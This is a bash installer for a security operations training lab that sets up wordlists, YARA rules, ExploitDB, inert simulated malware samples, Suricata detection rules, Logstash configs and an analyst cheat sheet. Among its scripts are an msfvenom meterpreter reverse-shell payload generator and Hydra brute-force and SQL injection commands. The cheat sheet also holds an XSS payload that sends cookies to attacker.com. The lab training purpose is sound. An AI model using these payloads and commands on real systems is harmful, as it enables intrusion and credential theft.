#!/bin/bash

# SOC Lab Tools Installation Script
# This script installs additional tools and configurations for the lab environment

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_DIR="$(dirname "$SCRIPT_DIR")"
TOOLS_DIR="$LAB_DIR/tools"

# Logging functions
log() {
    echo -e "${GREEN}[$(date +'%Y-%m-%d %H:%M:%S')] $1${NC}"
}

warn() {
    echo -e "${YELLOW}[$(date +'%Y-%m-%d %H:%M:%S')] WARNING: $1${NC}"
}

error() {
    echo -e "${RED}[$(date +'%Y-%m-%d %H:%M:%S')] ERROR: $1${NC}"
    exit 1
}

info() {
    echo -e "${BLUE}[$(date +'%Y-%m-%d %H:%M:%S')] $1${NC}"
}

# Create tools directory
create_tools_directory() {
    log "Creating tools directory..."
    mkdir -p "$TOOLS_DIR"/{malware-samples,wordlists,scripts,configs,payloads}
}

# Download common wordlists
download_wordlists() {
    log "Downloading common wordlists..."
    
    local wordlist_dir="$TOOLS_DIR/wordlists"
    
    # Download SecLists
    if [[ ! -d "$wordlist_dir/SecLists" ]]; then
        info "Downloading SecLists..."
        cd "$wordlist_dir"
        wget -q https://github.com/danielmiessler/SecLists/archive/master.zip -O SecLists.zip
        unzip -q SecLists.zip
        mv SecLists-master SecLists
        rm SecLists.zip
        log "SecLists downloaded successfully"
    else
        info "SecLists already exists, skipping download"
    fi
    
    # Download common passwords
    if [[ ! -f "$wordlist_dir/rockyou.txt" ]]; then
        info "Downloading rockyou.txt..."
        cd "$wordlist_dir"
        wget -q https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
        log "rockyou.txt downloaded successfully"
    else
        info "rockyou.txt already exists, skipping download"
    fi
    
    # Create custom wordlists
    create_custom_wordlists
}

# Create custom wordlists for lab environment
create_custom_wordlists() {
    log "Creating custom wordlists for lab environment..."
    
    local wordlist_dir="$TOOLS_DIR/wordlists"
    
    # Common usernames for lab
    cat > "$wordlist_dir/lab-usernames.txt" << 'EOF'
admin
administrator
root
user
guest
test
demo
vulnerable
soc
analyst
security
manager
operator
service
system
backup
support
EOF

    # Common passwords for lab
    cat > "$wordlist_dir/lab-passwords.txt" << 'EOF'
password
admin
123456
password123
admin123
root
toor
guest
test
demo
vulnerable
soclab123
P@ssw0rd123!
Password123!
qwerty
letmein
welcome
changeme
default
blank
EOF

    # Web directories for enumeration
    cat > "$wordlist_dir/web-directories.txt" << 'EOF'
admin
administrator
login
wp-admin
phpmyadmin
mysql
database
db
config
backup
uploads
files
images
css
js
api
v1
v2
test
demo
dev
staging
prod
production
EOF

    log "Custom wordlists created successfully"
}

# Download malware samples (safe/educational)
download_malware_samples() {
    log "Downloading educational malware samples..."
    
    local malware_dir="$TOOLS_DIR/malware-samples"
    
    # Create safe malware samples for analysis
    create_safe_malware_samples
    
    # Download YARA rules
    if [[ ! -d "$malware_dir/yara-rules" ]]; then
        info "Downloading YARA rules..."
        cd "$malware_dir"
        git clone --depth 1 https://github.com/Yara-Rules/rules.git yara-rules
        log "YARA rules downloaded successfully"
    else
        info "YARA rules already exist, skipping download"
    fi
}

# Create safe malware samples for educational purposes
create_safe_malware_samples() {
    local malware_dir="$TOOLS_DIR/malware-samples"
    
    # Create EICAR test file
    cat > "$malware_dir/eicar.txt" << 'EOF'
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
EOF

    # Create suspicious PowerShell script
    cat > "$malware_dir/suspicious.ps1" << 'EOF'
# Educational malware sample - PowerShell dropper simulation
# This is a SAFE educational sample for analysis practice

Write-Host "Simulated malware execution"

# Simulate network connection
$url = "http://malicious-c2-server.example.com/payload"
Write-Host "Attempting to connect to: $url"

# Simulate file creation
$tempFile = "$env:TEMP\suspicious_file.exe"
Write-Host "Creating file: $tempFile"

# Simulate registry modification
Write-Host "Modifying registry for persistence..."

# Simulate process injection
Write-Host "Attempting process injection..."

Write-Host "Malware simulation complete - This is for educational purposes only"
EOF

    # Create suspicious batch file
    cat > "$malware_dir/suspicious.bat" << 'EOF'
@echo off
REM Educational malware sample - Batch file simulation
REM This is a SAFE educational sample for analysis practice

echo Simulated malware execution
echo Attempting to disable Windows Defender...
echo Creating persistence mechanism...
echo Collecting system information...
echo Establishing C2 connection...
echo Malware simulation complete - This is for educational purposes only
pause
EOF

    # Create suspicious Python script
    cat > "$malware_dir/suspicious.py" << 'EOF'
#!/usr/bin/env python3
"""
Educational malware sample - Python backdoor simulation
This is a SAFE educational sample for analysis practice
"""

import os
import sys
import time

def simulate_malware():
    print("Simulated malware execution")
    print("Attempting to establish persistence...")
    print("Collecting system information...")
    print("Attempting to connect to C2 server...")
    print("Simulating data exfiltration...")
    print("Malware simulation complete - This is for educational purposes only")

if __name__ == "__main__":
    simulate_malware()
EOF

    chmod +x "$malware_dir/suspicious.py"
    
    log "Safe malware samples created for educational analysis"
}

# Create useful scripts
create_scripts() {
    log "Creating useful scripts for lab management..."
    
    local scripts_dir="$TOOLS_DIR/scripts"
    
    # Network scanner script
    cat > "$scripts_dir/network-scan.sh" << 'EOF'
#!/bin/bash

# Simple network scanner for lab environment
NETWORK="10.0.2.0/24"

echo "Scanning network: $NETWORK"
echo "=================================="

# Ping sweep
echo "Performing ping sweep..."
nmap -sn $NETWORK | grep -E "Nmap scan report|MAC Address"

echo ""
echo "Performing port scan on discovered hosts..."
nmap -sS -O $NETWORK

echo ""
echo "Network scan complete"
EOF

    # Log analyzer script
    cat > "$scripts_dir/analyze-logs.sh" << 'EOF'
#!/bin/bash

# Simple log analyzer for common attack patterns
LOG_FILE="${1:-/var/log/auth.log}"

if [[ ! -f "$LOG_FILE" ]]; then
    echo "Log file not found: $LOG_FILE"
    exit 1
fi

echo "Analyzing log file: $LOG_FILE"
echo "=================================="

echo "Failed login attempts:"
grep "Failed password" "$LOG_FILE" | wc -l

echo ""
echo "Top attacking IPs:"
grep "Failed password" "$LOG_FILE" | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr | head -10

echo ""
echo "Successful logins:"
grep "Accepted password" "$LOG_FILE" | wc -l

echo ""
echo "Recent failed login attempts:"
grep "Failed password" "$LOG_FILE" | tail -10
EOF

    # Payload generator script
    cat > "$scripts_dir/generate-payloads.sh" << 'EOF'
#!/bin/bash

# Payload generator for lab exercises
LHOST="${1:-10.0.2.15}"
LPORT="${2:-4444}"
OUTPUT_DIR="${3:-./payloads}"

mkdir -p "$OUTPUT_DIR"

echo "Generating payloads..."
echo "LHOST: $LHOST"
echo "LPORT: $LPORT"
echo "Output: $OUTPUT_DIR"

# Generate various payload formats
echo "Generating Windows executable..."
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > "$OUTPUT_DIR/windows_payload.exe" 2>/dev/null

echo "Generating Linux executable..."
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > "$OUTPUT_DIR/linux_payload" 2>/dev/null

echo "Generating PHP web shell..."
msfvenom -p php/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw > "$OUTPUT_DIR/webshell.php" 2>/dev/null

echo "Generating PowerShell payload..."
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f powershell > "$OUTPUT_DIR/payload.ps1" 2>/dev/null

chmod +x "$OUTPUT_DIR/linux_payload"

echo "Payloads generated in $OUTPUT_DIR"
ls -la "$OUTPUT_DIR"
EOF

    # Make scripts executable
    chmod +x "$scripts_dir"/*.sh
    
    log "Useful scripts created successfully"
}

# Create configuration templates
create_config_templates() {
    log "Creating configuration templates..."
    
    local configs_dir="$TOOLS_DIR/configs"
    
    # Suricata custom rules
    cat > "$configs_dir/suricata-lab-rules.rules" << 'EOF'
# Custom Suricata rules for SOC lab environment

# Brute force detection
alert tcp any any -> $HOME_NET 22 (msg:"SSH Brute Force Attempt"; flow:to_server,established; content:"SSH"; threshold:type both,track by_src,count 5,seconds 60; sid:2000001; rev:1;)
alert tcp any any -> $HOME_NET 3389 (msg:"RDP Brute Force Attempt"; flow:to_server,established; threshold:type both,track by_src,count 5,seconds 60; sid:2000002; rev:1;)

# Web application attacks
alert http any any -> $HOME_NET any (msg:"SQL Injection Attempt"; flow:to_server,established; content:"union select"; nocase; sid:2000003; rev:1;)
alert http any any -> $HOME_NET any (msg:"XSS Attempt"; flow:to_server,established; content:"<script"; nocase; sid:2000004; rev:1;)
alert http any any -> $HOME_NET any (msg:"Directory Traversal Attempt"; flow:to_server,established; content:"../"; http_uri; threshold:type both,track by_src,count 3,seconds 60; sid:2000005; rev:1;)

# Command injection
alert http any any -> $HOME_NET any (msg:"Command Injection Attempt"; flow:to_server,established; pcre:"/(\||;|&|`|\$\()/"; http_uri; sid:2000006; rev:1;)

# File upload attacks
alert http any any -> $HOME_NET any (msg:"Suspicious File Upload"; flow:to_server,established; content:"Content-Type: application/octet-stream"; http_header; sid:2000007; rev:1;)

# Malware communication
alert tcp $HOME_NET any -> any 4444 (msg:"Meterpreter Communication"; flow:to_server,established; content:"|00 00 00|"; depth:3; sid:2000008; rev:1;)
alert tcp $HOME_NET any -> any 4445 (msg:"Reverse Shell Communication"; flow:to_server,established; sid:2000009; rev:1;)

# Data exfiltration
alert http $HOME_NET any -> any any (msg:"Large HTTP POST - Possible Data Exfiltration"; flow:to_server,established; http_method; content:"POST"; dsize:>100000; sid:2000010; rev:1;)

# DNS tunneling
alert dns any any -> any any (msg:"Suspicious DNS Query Length"; dns_query; content:"|00|"; dsize:>100; sid:2000011; rev:1;)

# Network scanning
alert icmp any any -> $HOME_NET any (msg:"ICMP Ping Sweep"; itype:8; threshold:type both,track by_src,count 10,seconds 60; sid:2000012; rev:1;)
alert tcp any any -> $HOME_NET any (msg:"Port Scan Detected"; flags:S; threshold:type both,track by_src,count 20,seconds 60; sid:2000013; rev:1;)
EOF

    # Logstash configuration for lab
    cat > "$configs_dir/logstash-lab.conf" << 'EOF'
# Logstash configuration for SOC lab environment

input {
  beats {
    port => 5044
  }
  
  syslog {
    port => 514
  }
  
  tcp {
    port => 5000
    codec => json
  }
}

filter {
  # Windows Event Log parsing
  if [winlog] {
    mutate {
      add_field => { "log_type" => "windows" }
    }
    
    # Logon events
    if [winlog][event_id] == 4624 {
      mutate {
        add_field => { "event_category" => "logon_success" }
      }
    }
    
    if [winlog][event_id] == 4625 {
      mutate {
        add_field => { "event_category" => "logon_failure" }
      }
    }
    
    # Process creation
    if [winlog][event_id] == 4688 {
      mutate {
        add_field => { "event_category" => "process_creation" }
      }
    }
  }
  
  # Linux syslog parsing
  if [type] == "syslog" {
    mutate {
      add_field => { "log_type" => "linux" }
    }
    
    grok {
      match => { "message" => "%{SYSLOGTIMESTAMP:timestamp} %{IPORHOST:host} %{DATA:program}(?:\[%{POSINT:pid}\])?: %{GREEDYDATA:log_message}" }
      overwrite => [ "message" ]
    }
  }
  
  # SSH authentication parsing
  if [program] == "sshd" {
    if "Failed password" in [log_message] {
      mutate {
        add_field => { "event_category" => "ssh_failed_login" }
      }
      
      grok {
        match => { "log_message" => "Failed password for %{DATA:username} from %{IPORHOST:src_ip} port %{INT:src_port}" }
      }
    }
    
    if "Accepted password" in [log_message] {
      mutate {
        add_field => { "event_category" => "ssh_successful_login" }
      }
      
      grok {
        match => { "log_message" => "Accepted password for %{DATA:username} from %{IPORHOST:src_ip} port %{INT:src_port}" }
      }
    }
  }
  
  # Apache access log parsing
  if [fields][log_type] == "apache_access" {
    grok {
      match => { "message" => "%{COMBINEDAPACHELOG}" }
    }
    
    date {
      match => [ "timestamp", "dd/MMM/yyyy:HH:mm:ss Z" ]
    }
    
    mutate {
      convert => { "response" => "integer" }
      convert => { "bytes" => "integer" }
    }
  }
  
  # Add GeoIP information
  if [src_ip] {
    geoip {
      source => "src_ip"
      target => "geoip"
    }
  }
}

output {
  elasticsearch {
    hosts => ["localhost:9200"]
    index => "soc-lab-%{+YYYY.MM.dd}"
  }
  
  stdout {
    codec => rubydebug
  }
}
EOF

    # Kibana dashboard configuration
    cat > "$configs_dir/kibana-dashboards.json" << 'EOF'
{
  "version": "7.15.0",
  "objects": [
    {
      "id": "soc-lab-overview",
      "type": "dashboard",
      "attributes": {
        "title": "SOC Lab Overview",
        "description": "Main dashboard for SOC lab monitoring",
        "panelsJSON": "[]",
        "timeRestore": false,
        "version": 1
      }
    }
  ]
}
EOF

    log "Configuration templates created successfully"
}

# Download additional tools
download_additional_tools() {
    log "Downloading additional security tools..."
    
    local tools_dir="$TOOLS_DIR"
    
    # Download Volatility profiles
    if [[ ! -d "$tools_dir/volatility-profiles" ]]; then
        info "Downloading Volatility profiles..."
        mkdir -p "$tools_dir/volatility-profiles"
        cd "$tools_dir/volatility-profiles"
        
        # Download common Windows profiles
        wget -q https://github.com/volatilityfoundation/profiles/archive/master.zip -O profiles.zip
        unzip -q profiles.zip
        mv profiles-master/* .
        rm -rf profiles-master profiles.zip
        
        log "Volatility profiles downloaded successfully"
    else
        info "Volatility profiles already exist, skipping download"
    fi
    
    # Download common exploits for educational purposes
    if [[ ! -d "$tools_dir/exploits" ]]; then
        info "Downloading educational exploit database..."
        mkdir -p "$tools_dir/exploits"
        cd "$tools_dir/exploits"
        
        # Download exploit database
        git clone --depth 1 https://github.com/offensive-security/exploitdb.git
        
        log "Exploit database downloaded successfully"
    else
        info "Exploit database already exists, skipping download"
    fi
}

# Create lab documentation
create_lab_documentation() {
    log "Creating lab documentation..."
    
    local docs_dir="$TOOLS_DIR/documentation"
    mkdir -p "$docs_dir"
    
    # Create tool usage guide
    cat > "$docs_dir/tool-usage-guide.md" << 'EOF'
# SOC Lab Tools Usage Guide

## Wordlists

### Location
- `/tools/wordlists/`

### Available Wordlists
- `SecLists/` - Comprehensive security testing wordlists
- `rockyou.txt` - Common passwords
- `lab-usernames.txt` - Common usernames for lab environment
- `lab-passwords.txt` - Common passwords for lab environment
- `web-directories.txt` - Web directory enumeration

### Usage Examples
```bash
# Brute force SSH with Hydra
hydra -L lab-usernames.txt -P lab-passwords.txt 10.0.2.101 ssh

# Directory enumeration with Gobuster
gobuster dir -u http://10.0.2.101 -w web-directories.txt
```

## Malware Samples

### Location
- `/tools/malware-samples/`

### Available Samples
- `eicar.txt` - EICAR test file for antivirus testing
- `suspicious.ps1` - PowerShell malware simulation
- `suspicious.bat` - Batch file malware simulation
- `suspicious.py` - Python backdoor simulation
- `yara-rules/` - YARA rules for malware detection

### Usage Examples
```bash
# Scan with YARA
yara -r yara-rules/ malware-samples/

# Analyze with strings
strings suspicious.ps1 | grep -i malicious
```

## Scripts

### Location
- `/tools/scripts/`

### Available Scripts
- `network-scan.sh` - Network discovery and port scanning
- `analyze-logs.sh` - Log analysis for attack patterns
- `generate-payloads.sh` - Payload generation for testing

### Usage Examples
```bash
# Scan lab network
./network-scan.sh

# Analyze authentication logs
./analyze-logs.sh /var/log/auth.log

# Generate payloads
./generate-payloads.sh 10.0.2.15 4444 ./payloads
```

## Configuration Templates

### Location
- `/tools/configs/`

### Available Configurations
- `suricata-lab-rules.rules` - Custom Suricata rules for lab
- `logstash-lab.conf` - Logstash configuration for log processing
- `kibana-dashboards.json` - Kibana dashboard templates

### Usage Examples
```bash
# Apply Suricata rules
sudo cp suricata-lab-rules.rules /etc/suricata/rules/
sudo systemctl restart suricata

# Apply Logstash configuration
sudo cp logstash-lab.conf /etc/logstash/conf.d/
sudo systemctl restart logstash
```
EOF

    # Create cheat sheet
    cat > "$docs_dir/soc-analyst-cheatsheet.md" << 'EOF'
# SOC Analyst Cheat Sheet

## Log Analysis Commands

### Linux Log Analysis
```bash
# View authentication logs
tail -f /var/log/auth.log

# Count failed login attempts
grep "Failed password" /var/log/auth.log | wc -l

# Top attacking IPs
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr

# Recent successful logins
grep "Accepted password" /var/log/auth.log | tail -10
```

### Windows Event Log Analysis
```powershell
# View Security Event Log
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4625} | Select-Object TimeCreated, Id, LevelDisplayName, Message

# Failed logon attempts
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} | Measure-Object

# Successful logons
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | Select-Object TimeCreated, Message | Head -10
```

## Network Analysis

### Nmap Commands
```bash
# Network discovery
nmap -sn 10.0.2.0/24

# Port scan
nmap -sS -sV 10.0.2.101

# Vulnerability scan
nmap --script vuln 10.0.2.101
```

### Wireshark Filters
```
# HTTP traffic
http

# Failed login attempts
tcp.port == 22 and tcp.flags.reset == 1

# Large data transfers
tcp.len > 1000

# Suspicious DNS queries
dns and dns.qry.name contains "malicious"
```

## Web Application Testing

### SQL Injection
```bash
# Basic SQL injection test
curl "http://10.0.2.101/dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit"

# SQLMap automated testing
sqlmap -u "http://10.0.2.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --dbs
```

### XSS Testing
```bash
# Basic XSS payload
<script>alert('XSS')</script>

# Cookie stealing payload
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

## Incident Response

### Initial Assessment
1. Identify the scope of the incident
2. Preserve evidence
3. Contain the threat
4. Eradicate the threat
5. Recover systems
6. Document lessons learned

### Evidence Collection
```bash
# Create memory dump
dd if=/dev/mem of=/tmp/memory.dump

# Create disk image
dd if=/dev/sda of=/tmp/disk.img bs=4096

# Collect network connections
netstat -tulpn > /tmp/network_connections.txt

# Collect running processes
ps aux > /tmp/running_processes.txt
```

## Threat Hunting

### Common IOCs
- Unusual network connections
- Suspicious process execution
- Unexpected file modifications
- Abnormal user behavior
- High-frequency failed login attempts

### Hunting Queries
```bash
# Elasticsearch/Kibana queries
event_category:"ssh_failed_login" AND src_ip:"10.0.2.15"
winlog.event_id:4688 AND process.command_line:*powershell*
http.request.method:"POST" AND response:200 AND bytes:>100000
```
EOF

    log "Lab documentation created successfully"
}

# Main installation function
main() {
    echo -e "${BLUE}"
    echo "========================================"
    echo "    SOC Lab Tools Installation"
    echo "========================================"
    echo -e "${NC}"
    
    log "Starting tools installation..."
    
    # Create directory structure
    create_tools_directory
    
    # Download and create resources
    download_wordlists
    download_malware_samples
    download_additional_tools
    
    # Create scripts and configurations
    create_scripts
    create_config_templates
    create_lab_documentation
    
    echo -e "${GREEN}"
    echo "========================================"
    echo "    Installation Complete!"
    echo "========================================"
    echo -e "${NC}"
    
    echo "Tools and resources installed in: $TOOLS_DIR"
    echo ""
    echo "Available resources:"
    echo "  - Wordlists for password attacks and enumeration"
    echo "  - Safe malware samples for analysis practice"
    echo "  - Useful scripts for network scanning and log analysis"
    echo "  - Configuration templates for SIEM tools"
    echo "  - Documentation and cheat sheets"
    echo ""
    echo "See $TOOLS_DIR/documentation/ for usage guides"
}

# Run main function
main "$@"